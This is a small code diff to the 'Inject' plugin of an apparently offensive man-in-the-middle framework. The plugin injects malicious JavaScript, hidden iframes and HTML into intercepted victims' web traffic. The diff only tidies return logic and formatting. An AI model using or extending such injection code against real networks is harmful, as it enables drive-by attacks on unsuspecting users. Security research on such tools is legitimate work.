@@ -87,14 +87,13 @@ class Inject(CacheKill, Plugin):
                 self.dtable[ip+hn] = True
                 self.count += 1
                 mitmf_logger.info("%s [%s] Injected malicious html" % (ip, hn))
-                return {'request': request, 'data': data}
-            else:
-                return
+        
+        return {'request': request, 'data': data}
 
     def _get_payload(self):
         return self._get_js() + self._get_iframe() + self.html_payload
 
-    def add_options(self,options):
+    def add_options(self, options):
         options.add_argument("--js-url", type=str, help="Location of your (presumably) malicious Javascript.")
         options.add_argument("--html-url", type=str, help="Location of your (presumably) malicious HTML. Injected via hidden iframe.")
         options.add_argument("--html-payload", type=str, default="", help="String you would like to inject.")
@@ -136,7 +135,6 @@ class Inject(CacheKill, Plugin):
         if self.per_domain:
             return not ip+hn in self.dtable
 
-        #print mime
         return mime.find(self.mime) != -1
 
     def _get_req_info(self, request):
